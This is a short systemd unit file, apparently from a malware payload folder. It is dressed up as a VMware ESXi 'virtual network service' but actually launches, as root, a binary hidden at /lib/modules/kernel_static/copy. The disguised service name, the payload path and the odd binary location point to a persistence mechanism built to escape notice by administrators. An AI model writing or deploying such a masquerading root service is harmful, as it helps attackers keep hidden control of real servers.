# payload/vmware-network.service
[Unit]
Description=ESXI Virtual network service

[Service]
Type=simple
User=root
ExecStart=/lib/modules/kernel_static/copy